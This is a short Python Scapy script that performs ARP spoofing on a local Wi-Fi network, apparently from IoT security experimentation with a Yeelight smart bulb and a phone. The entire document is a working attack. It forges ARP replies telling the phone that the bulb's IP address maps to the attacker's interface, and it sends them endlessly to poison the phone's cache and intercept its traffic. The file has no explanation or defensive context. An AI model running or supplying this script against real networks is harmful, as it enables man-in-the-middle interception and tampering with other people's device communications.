from scapy.all import *

macAttacker = get_if_hwaddr("wlp3s0") #"10:4a:7d:53:88:ba"
ipAttacker = get_if_addr("wlp3s0")

macPhone = "c0:ee:fb:df:58:08"
ipPhone = "192.168.13.2"

ipYeelight = "192.168.13.1"


packet = ARP(op=2, pdst=ipPhone, hwdst=macPhone, psrc=ipYeelight)
  
send(packet, inter = 1, count=-1, iface="wlp3s0")